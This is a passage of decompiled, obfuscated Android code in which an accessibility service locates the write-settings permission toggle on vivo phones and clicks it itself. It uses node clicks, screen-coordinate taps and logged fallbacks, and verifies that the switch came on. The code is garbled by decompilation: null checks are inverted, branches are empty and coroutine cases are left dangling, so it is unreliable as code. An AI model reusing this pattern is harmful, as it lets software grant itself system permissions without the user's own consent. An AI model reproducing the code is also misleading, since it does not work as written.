                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 14;
                                                                                                        c0327b215 = c0327b23;
                                                                                                        accessibilityNodeInfo18 = accessibilityNodeInfo8;
                                                                                                        if (b81.m210571b1(300L, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12) == coroutineSingletons) {
                                                                                                        }
                                                                                                        c0327b215.m211738e3();
                                                                                                        Boolean boolM214689a715 = t60.m214689a7(true);
                                                                                                        m211711f4(accessibilityNodeInfo18);
                                                                                                        AbstractC0780a0.m213692a3(c0327b215.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b215, null), 3);
                                                                                                        return boolM214689a715;
                                                                                                    }
                                                                                                    AccessibilityNodeInfo accessibilityNodeInfoM211700c24 = m211700c2(accessibilityNodeInfo8);
                                                                                                    boolean zPerformAction3 = accessibilityNodeInfoM211700c24 != null ? accessibilityNodeInfoM211700c24.performAction(16) : false;
                                                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 兜底2 ACTION_CLICK: " + zPerformAction3);
                                                                                                    C0327b2 c0327b226 = c0327b23;
                                                                                                    AccessibilityNodeInfo accessibilityNodeInfo31 = accessibilityNodeInfo8;
                                                                                                    c0327b216 = c0327b23;
                                                                                                    c0327b216 = c0327b23;
                                                                                                    accessibilityNodeInfo19 = accessibilityNodeInfo8;
                                                                                                    accessibilityNodeInfo19 = accessibilityNodeInfo8;
                                                                                                    if (!zPerformAction3) {
                                                                                                        if (i6 > 0 && iCenterY > 0) {
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b23;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo8;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = null;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52941a3 = null;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 15;
                                                                                                            objM211715a4 = c0327b23.m211747f2(i6, iCenterY, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12);
                                                                                                            c0327b218 = c0327b23;
                                                                                                            accessibilityNodeInfo21 = accessibilityNodeInfo8;
                                                                                                            if (objM211715a4 == coroutineSingletons) {
                                                                                                            }
                                                                                                            c0327b216 = c0327b218;
                                                                                                            accessibilityNodeInfo19 = accessibilityNodeInfo21;
                                                                                                            if (((Boolean) objM211715a4).booleanValue()) {
                                                                                                                c0327b226 = c0327b218;
                                                                                                                accessibilityNodeInfo31 = accessibilityNodeInfo21;
                                                                                                            }
                                                                                                        }
                                                                                                        z3 = false;
                                                                                                        c0327b217 = c0327b216;
                                                                                                        accessibilityNodeInfo20 = accessibilityNodeInfo19;
                                                                                                        if (!z3) {
                                                                                                            t60.m214704c5("WriteSettingsPerm", "[调试] ❌ 兜底2点击失败");
                                                                                                            c0327b219 = c0327b217;
                                                                                                            accessibilityNodeInfo22 = accessibilityNodeInfo20;
                                                                                                            Boolean boolM214689a716 = t60.m214689a7(false);
                                                                                                            c0327b219.getClass();
                                                                                                            m211711f4(accessibilityNodeInfo22);
                                                                                                            AbstractC0780a0.m213692a3(c0327b219.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b219, null), 3);
                                                                                                            return boolM214689a716;
                                                                                                        }
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b217;
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo20;
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = null;
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52941a3 = null;
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 16;
                                                                                                        c0327b220 = c0327b217;
                                                                                                        accessibilityNodeInfo23 = accessibilityNodeInfo20;
                                                                                                        if (b81.m210571b1(500L, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12) != coroutineSingletons) {
                                                                                                            AccessibilityNodeInfo rootInActiveWindow4 = c0327b220.f53166a0.getRootInActiveWindow();
                                                                                                            AccessibilityNodeInfo accessibilityNodeInfoM211700c25 = rootInActiveWindow4 == null ? m211700c2(rootInActiveWindow4) : null;
                                                                                                            zIsChecked4 = accessibilityNodeInfoM211700c25 == null ? accessibilityNodeInfoM211700c25.isChecked() : true;
                                                                                                            m211711f4(rootInActiveWindow4);
                                                                                                            if (!zIsChecked4) {
                                                                                                                t60.m214704c5("WriteSettingsPerm", "[调试] ✅ 兜底2点击成功! 开关已开启");
                                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b220;
                                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo23;
                                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 17;
                                                                                                                c0327b221 = c0327b220;
                                                                                                                accessibilityNodeInfo24 = accessibilityNodeInfo23;
                                                                                                                break;
                                                                                                            } else {
                                                                                                                t60.m214704c5("WriteSettingsPerm", "[调试] ⚠️ 兜底2点击后开关仍关闭");
                                                                                                                c0327b219 = c0327b220;
                                                                                                                accessibilityNodeInfo22 = accessibilityNodeInfo23;
                                                                                                                Boolean boolM214689a7162 = t60.m214689a7(false);
                                                                                                                c0327b219.getClass();
                                                                                                                m211711f4(accessibilityNodeInfo22);
                                                                                                                AbstractC0780a0.m213692a3(c0327b219.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b219, null), 3);
                                                                                                                return boolM214689a7162;
                                                                                                            }
                                                                                                        }
                                                                                                    }
                                                                                                    z3 = true;
                                                                                                    c0327b217 = c0327b226;
                                                                                                    accessibilityNodeInfo20 = accessibilityNodeInfo31;
                                                                                                    if (!z3) {
                                                                                                    }
                                                                                                } else {
                                                                                                    AccessibilityNodeInfo child = parent.getChild(1);
                                                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 父节点第二个子节点: " + (child != null ? "存在" : str3));
                                                                                                    if (child == null) {
                                                                                                        t60.m214726f4("WriteSettingsPerm", "❌ 无法获取第二个子节点");
                                                                                                        Boolean boolM214689a717 = t60.m214689a7(false);
                                                                                                        c0327b23.getClass();
                                                                                                        m211711f4(accessibilityNodeInfo8);
                                                                                                        AbstractC0780a0.m213692a3(c0327b23.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b23, null), 3);
                                                                                                        return boolM214689a717;
                                                                                                    }
                                                                                                    Rect rect8 = new Rect();
                                                                                                    child.getBoundsInScreen(rect8);
                                                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 右侧区域位置: " + rect8.left + "," + rect8.top + "," + rect8.right + "," + rect8.bottom);
                                                                                                    if (rect8.isEmpty()) {
                                                                                                        t60.m214726f4("WriteSettingsPerm", "⚠️ 第二个子节点矩形为空");
                                                                                                        Boolean boolM214689a718 = t60.m214689a7(false);
                                                                                                        c0327b23.getClass();
                                                                                                        m211711f4(accessibilityNodeInfo8);
                                                                                                        AbstractC0780a0.m213692a3(c0327b23.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b23, null), 3);
                                                                                                        return boolM214689a718;
                                                                                                    }
                                                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 🎯 点击右侧区域中心: (" + rect8.centerX() + ", " + rect8.centerY() + ")");
                                                                                                    boolean zPerformAction4 = child.performAction(16);
                                                                                                    StringBuilder sb4 = new StringBuilder();
                                                                                                    sb4.append("[调试] 右侧区域 ACTION_CLICK: ");
                                                                                                    sb4.append(zPerformAction4);
                                                                                                    t60.m214704c5("WriteSettingsPerm", sb4.toString());
                                                                                                    C0327b2 c0327b227 = c0327b23;
                                                                                                    AccessibilityNodeInfo accessibilityNodeInfo32 = accessibilityNodeInfo8;
                                                                                                    if (!zPerformAction4) {
                                                                                                        float fCenterX4 = rect8.centerX();
                                                                                                        float fCenterY4 = rect8.centerY();
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b23;
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo8;
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = null;
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52941a3 = null;
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 18;
                                                                                                        objM211715a4 = c0327b23.m211747f2(fCenterX4, fCenterY4, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12);
                                                                                                        c0327b223 = c0327b23;
                                                                                                        accessibilityNodeInfo26 = accessibilityNodeInfo8;
                                                                                                        if (objM211715a4 == coroutineSingletons) {
                                                                                                        }
                                                                                                        if (((Boolean) objM211715a4).booleanValue()) {
                                                                                                            z4 = false;
                                                                                                            c0327b222 = c0327b223;
                                                                                                            accessibilityNodeInfo25 = accessibilityNodeInfo26;
                                                                                                            if (z4) {
                                                                                                                t60.m214726f4("WriteSettingsPerm", "❌ vivo右侧开关坐标点击失败");
                                                                                                                Boolean boolM214689a719 = t60.m214689a7(false);
                                                                                                                c0327b222.getClass();
                                                                                                                m211711f4(accessibilityNodeInfo25);
                                                                                                                AbstractC0780a0.m213692a3(c0327b222.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b222, null), 3);
                                                                                                                return boolM214689a719;
                                                                                                            }
                                                                                                            t60.m214704c5("WriteSettingsPerm", "[调试] ✅ 右侧区域点击成功!");
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b222;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo25;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = null;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52941a3 = null;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 19;
                                                                                                            c0327b224 = c0327b222;
                                                                                                            accessibilityNodeInfo27 = accessibilityNodeInfo25;
                                                                                                            if (b81.m210571b1(300L, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12) == coroutineSingletons) {
                                                                                                            }
                                                                                                            c0327b224.m211738e3();
                                                                                                            Boolean boolM214689a720 = t60.m214689a7(true);
                                                                                                            m211711f4(accessibilityNodeInfo27);
                                                                                                            AbstractC0780a0.m213692a3(c0327b224.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b224, null), 3);
                                                                                                            return boolM214689a720;
                                                                                                        }
                                                                                                        c0327b227 = c0327b223;
                                                                                                        accessibilityNodeInfo32 = accessibilityNodeInfo26;
                                                                                                    }
                                                                                                    z4 = true;
                                                                                                    c0327b222 = c0327b227;
                                                                                                    accessibilityNodeInfo25 = accessibilityNodeInfo32;
                                                                                                    if (z4) {
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                            str3 = "null";
                                                                                            if (parent != null) {
                                                                                            }
                                                                                            t60.m214726f4("WriteSettingsPerm", "❌ 父节点不存在或子节点不足，无法使用第二个子节点坐标 → 启用兜底方案");
                                                                                            t60.m214704c5("WriteSettingsPerm", "[调试] 兜底1: 查找全局可见Switch控件...");
                                                                                            c0327b23.getClass();
                                                                                            accessibilityNodeInfoM211700c2 = m211700c2(accessibilityNodeInfo8);
                                                                                            if (accessibilityNodeInfoM211700c2 != null) {
                                                                                            }
                                                                                            t60.m214704c5("WriteSettingsPerm", "[调试] 兜底2: 使用文本Y + 屏幕宽88%...");
                                                                                            Rect rect72 = new Rect();
                                                                                            accessibilityNodeInfo.getBoundsInScreen(rect72);
                                                                                            DisplayMetrics displayMetrics22 = c0327b23.f53167a1.getResources().getDisplayMetrics();
                                                                                            int i42 = displayMetrics22.widthPixels;
                                                                                            int i52 = displayMetrics22.heightPixels;
                                                                                            int i62 = (int) (i42 * 0.88f);
                                                                                            int iCenterY2 = rect72.centerY();
                                                                                            t60.m214704c5("WriteSettingsPerm", "[调试] 屏幕: " + i42 + str + i52);
                                                                                            t60.m214704c5("WriteSettingsPerm", "[调试] 文本位置: " + rect72.left + "," + rect72.top + "," + rect72.right + "," + rect72.bottom);
                                                                                            StringBuilder sb32 = new StringBuilder();
                                                                                            sb32.append("[调试] 🎯 兜底2点击: (");
                                                                                            sb32.append(i62);
                                                                                            sb32.append(", ");
                                                                                            sb32.append(iCenterY2);
                                                                                            sb32.append(") [X=屏幕宽*0.88, Y=文本Y居中]");
                                                                                            t60.m214704c5("WriteSettingsPerm", sb32.toString());
                                                                                            AccessibilityNodeInfo accessibilityNodeInfoM211700c232 = m211700c2(accessibilityNodeInfo8);
                                                                                            if (accessibilityNodeInfoM211700c232 != null) {
                                                                                            }
                                                                                            t60.m214704c5("WriteSettingsPerm", "[调试] 兜底2当前开关状态: " + zIsChecked2);
                                                                                            if (zIsChecked2) {
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                            c0327b24 = c0327b2;
                                                                            accessibilityNodeInfo5 = accessibilityNodeInfo4;
                                                                            DisplayMetrics displayMetrics3 = c0327b24.f53167a1.getResources().getDisplayMetrics();
                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b24;
                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo5;
                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = accessibilityNodeInfo;
                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 5;
                                                                            objM211747f22 = c0327b24.m211747f2(displayMetrics3.widthPixels * 0.9f, displayMetrics3.heightPixels * 0.25f, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12);
                                                                            c0327b27 = c0327b24;
                                                                            accessibilityNodeInfo9 = accessibilityNodeInfo5;
                                                                            if (objM211747f22 != coroutineSingletons) {
                                                                            }
                                                                        }
                                                                    }
                                                                    if (accessibilityNodeInfo28 != null) {
                                                                    }
                                                                    c0327b24 = c0327b2;
                                                                    accessibilityNodeInfo5 = accessibilityNodeInfo4;
                                                                    DisplayMetrics displayMetrics32 = c0327b24.f53167a1.getResources().getDisplayMetrics();
                                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b24;
                                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo5;
                                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = accessibilityNodeInfo;
                                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 5;
                                                                    objM211747f22 = c0327b24.m211747f2(displayMetrics32.widthPixels * 0.9f, displayMetrics32.heightPixels * 0.25f, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12);
                                                                    c0327b27 = c0327b24;
                                                                    accessibilityNodeInfo9 = accessibilityNodeInfo5;
                                                                    if (objM211747f22 != coroutineSingletons) {
                                                                    }
                                                                } else {
                                                                    c0327b23 = c0327b2;
                                                                    accessibilityNodeInfo8 = accessibilityNodeInfo4;
                                                                    parent = accessibilityNodeInfo.getParent();
                                                                    if (parent == null) {
                                                                    }
                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 父节点: " + str2);
                                                                    if (parent != null) {
                                                                    }
                                                                    str3 = "null";
                                                                    if (parent != null) {
                                                                    }
                                                                    t60.m214726f4("WriteSettingsPerm", "❌ 父节点不存在或子节点不足，无法使用第二个子节点坐标 → 启用兜底方案");
                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 兜底1: 查找全局可见Switch控件...");
                                                                    c0327b23.getClass();
                                                                    accessibilityNodeInfoM211700c2 = m211700c2(accessibilityNodeInfo8);
                                                                    if (accessibilityNodeInfoM211700c2 != null) {
                                                                    }
                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 兜底2: 使用文本Y + 屏幕宽88%...");
                                                                    Rect rect722 = new Rect();
                                                                    accessibilityNodeInfo.getBoundsInScreen(rect722);
                                                                    DisplayMetrics displayMetrics222 = c0327b23.f53167a1.getResources().getDisplayMetrics();
                                                                    int i422 = displayMetrics222.widthPixels;
                                                                    int i522 = displayMetrics222.heightPixels;
                                                                    int i622 = (int) (i422 * 0.88f);
                                                                    int iCenterY22 = rect722.centerY();
                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 屏幕: " + i422 + str + i522);
                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 文本位置: " + rect722.left + "," + rect722.top + "," + rect722.right + "," + rect722.bottom);
                                                                    StringBuilder sb322 = new StringBuilder();
                                                                    sb322.append("[调试] 🎯 兜底2点击: (");
                                                                    sb322.append(i622);
                                                                    sb322.append(", ");
                                                                    sb322.append(iCenterY22);
                                                                    sb322.append(") [X=屏幕宽*0.88, Y=文本Y居中]");
                                                                    t60.m214704c5("WriteSettingsPerm", sb322.toString());
                                                                    AccessibilityNodeInfo accessibilityNodeInfoM211700c2322 = m211700c2(accessibilityNodeInfo8);
                                                                    if (accessibilityNodeInfoM211700c2322 != null) {
                                                                    }
                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 兜底2当前开关状态: " + zIsChecked2);
                                                                    if (zIsChecked2) {
                                                                    }
                                                                }
                                                            } catch (Exception e2) {
                                                                e = e2;
                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = c0327b2;
                                                                t60.m214705c6("WriteSettingsPerm", "❌ vivo右侧开关方案异常", e);
                                                                Boolean boolM214689a7122 = t60.m214689a7(false);
                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.getClass();
                                                                m211711f4(rootInActiveWindow2);
                                                                AbstractC0780a0.m213692a3(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1, null), 3);
                                                                return boolM214689a7122;
                                                            } catch (Throwable th2) {
                                                                th = th2;
                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = c0327b2;
                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.getClass();
                                                                m211711f4(rootInActiveWindow2);
                                                                AbstractC0780a0.m213692a3(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1, null), 3);
                                                                throw th;
                                                            }
                                                        }
                                                    } else {
                                                        c0327b2 = this;
                                                        accessibilityNodeInfo4 = rootInActiveWindow2;
                                                        if (i == 0) {
                                                        }
                                                    }
                                                    return coroutineSingletons;
                                                } catch (Exception e3) {
                                                    e = e3;
                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = this;
                                                    t60.m214705c6("WriteSettingsPerm", "❌ vivo右侧开关方案异常", e);
                                                    Boolean boolM214689a71222 = t60.m214689a7(false);
                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.getClass();
                                                    m211711f4(rootInActiveWindow2);
                                                    AbstractC0780a0.m213692a3(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1, null), 3);
                                                    return boolM214689a71222;
                                                } catch (Throwable th3) {
                                                    th = th3;
                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = this;
                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.getClass();
                                                    m211711f4(rootInActiveWindow2);
                                                    AbstractC0780a0.m213692a3(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1, null), 3);
                                                    throw th;
                                                }
                                            } catch (Exception e4) {
                                                e = e4;
                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = this;
                                            } catch (Throwable th4) {
                                                th = th4;
                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = this;
                                            }
                                            break;
                                        case 1:
                                            AccessibilityNodeInfo accessibilityNodeInfo33 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            c0327b22 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            accessibilityNodeInfo3 = accessibilityNodeInfo33;
                                            accessibilityNodeInfo2 = accessibilityNodeInfo3;
                                            if (((Boolean) objM211715a4).booleanValue()) {
                                            }
                                            t60.m214726f4("WriteSettingsPerm", "❌ 未找到vivo目标文本节点");
                                            Boolean boolM214689a7322 = t60.m214689a7(false);
                                            c0327b22.getClass();
                                            m211711f4(accessibilityNodeInfo2);
                                            AbstractC0780a0.m213692a3(c0327b22.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b22, null), 3);
                                            return boolM214689a7322;
                                        case 2:
                                            int i7 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52942a4;
                                            AccessibilityNodeInfo accessibilityNodeInfo34 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52940a2;
                                            AccessibilityNodeInfo accessibilityNodeInfo35 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            c0327b2 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            accessibilityNodeInfo = accessibilityNodeInfo34;
                                            rootInActiveWindow2 = accessibilityNodeInfo35;
                                            objM211717a6 = objM211715a4;
                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1;
                                            str = "x";
                                            i = i7;
                                            if (!((Boolean) objM211717a6).booleanValue()) {
                                            }
                                            break;
                                        case 3:
                                            AccessibilityNodeInfo accessibilityNodeInfo36 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52940a2;
                                            AccessibilityNodeInfo accessibilityNodeInfo37 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b228 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            objM211747f2 = objM211715a4;
                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1;
                                            c0327b25 = c0327b228;
                                            str = "x";
                                            accessibilityNodeInfo = accessibilityNodeInfo36;
                                            accessibilityNodeInfo6 = accessibilityNodeInfo37;
                                            c0327b24 = c0327b25;
                                            accessibilityNodeInfo5 = accessibilityNodeInfo6;
                                            if (!((Boolean) objM211747f2).booleanValue()) {
                                            }
                                            return coroutineSingletons;
                                        case 4:
                                            AccessibilityNodeInfo accessibilityNodeInfo38 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b229 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            accessibilityNodeInfo7 = accessibilityNodeInfo38;
                                            c0327b26 = c0327b229;
                                            if (c0327b26.m211734d5()) {
                                            }
                                            break;
                                        case 5:
                                            AccessibilityNodeInfo accessibilityNodeInfo39 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52940a2;
                                            AccessibilityNodeInfo accessibilityNodeInfo40 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b230 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            objM211747f22 = objM211715a4;
                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1;
                                            c0327b27 = c0327b230;
                                            str = "x";
                                            accessibilityNodeInfo = accessibilityNodeInfo39;
                                            accessibilityNodeInfo9 = accessibilityNodeInfo40;
                                            c0327b23 = c0327b27;
                                            accessibilityNodeInfo8 = accessibilityNodeInfo9;
                                            if (!((Boolean) objM211747f22).booleanValue()) {
                                            }
                                            return coroutineSingletons;
                                        case 6:
                                            AccessibilityNodeInfo accessibilityNodeInfo41 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b231 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            accessibilityNodeInfo10 = accessibilityNodeInfo41;
                                            c0327b28 = c0327b231;
                                            if (c0327b28.m211734d5()) {
                                            }
                                            break;
                                        case 7:
                                            AccessibilityNodeInfo accessibilityNodeInfo42 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b232 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            accessibilityNodeInfo11 = accessibilityNodeInfo42;
                                            c0327b29 = c0327b232;
                                            c0327b29.m211738e3();
                                            Boolean boolM214689a7102 = t60.m214689a7(true);
                                            m211711f4(accessibilityNodeInfo11);
                                            AbstractC0780a0.m213692a3(c0327b29.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b29, null), 3);
                                            return boolM214689a7102;
                                        case 8:
                                            AccessibilityNodeInfo accessibilityNodeInfo43 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52941a3;
                                            AccessibilityNodeInfo accessibilityNodeInfo44 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52940a2;
                                            AccessibilityNodeInfo accessibilityNodeInfo45 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b233 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            accessibilityNodeInfo = accessibilityNodeInfo44;
                                            accessibilityNodeInfo14 = accessibilityNodeInfo45;
                                            parent = accessibilityNodeInfo43;
                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1;
                                            str3 = "null";
                                            c0327b210 = c0327b233;
                                            objM211747f23 = objM211715a4;
                                            str = "x";
                                            if (((Boolean) objM211747f23).booleanValue()) {
                                            }
                                            break;
                                        case 9:
                                            AccessibilityNodeInfo accessibilityNodeInfo46 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52941a3;
                                            accessibilityNodeInfo13 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52940a2;
                                            accessibilityNodeInfo12 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b234 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            try {
                                                kg1.m213544f4(objM211715a4);
                                                parent = accessibilityNodeInfo46;
                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1;
                                                str3 = "null";
                                                c0327b23 = c0327b234;
                                                str = "x";
                                                rootInActiveWindow = c0327b23.f53166a0.getRootInActiveWindow();
                                                if (rootInActiveWindow == null) {
                                                }
                                                if (accessibilityNodeInfoM211704d1 == null) {
                                                }
                                                m211711f4(rootInActiveWindow);
                                                if (!zIsChecked) {
                                                }
                                            } catch (Exception e5) {
                                                e = e5;
                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = c0327b234;
                                                rootInActiveWindow2 = accessibilityNodeInfo12;
                                                t60.m214705c6("WriteSettingsPerm", "❌ vivo右侧开关方案异常", e);
                                                Boolean boolM214689a712222 = t60.m214689a7(false);
                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.getClass();
                                                m211711f4(rootInActiveWindow2);
                                                AbstractC0780a0.m213692a3(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1, null), 3);
                                                return boolM214689a712222;
                                            } catch (Throwable th5) {
                                                th = th5;
                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = c0327b234;
                                                rootInActiveWindow2 = accessibilityNodeInfo12;
                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.getClass();
                                                m211711f4(rootInActiveWindow2);
                                                AbstractC0780a0.m213692a3(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1, null), 3);
                                                throw th;
                                            }
                                            break;
                                        case 10:
                                            AccessibilityNodeInfo accessibilityNodeInfo47 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52939a1;
                                            C0327b2 c0327b235 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52938a0;
                                            kg1.m213544f4(objM211715a4);
                                            accessibilityNodeInfo12 = accessibilityNodeInfo47;
                                            c0327b211 = c0327b235;
                                            c0327b211.m211738e3();
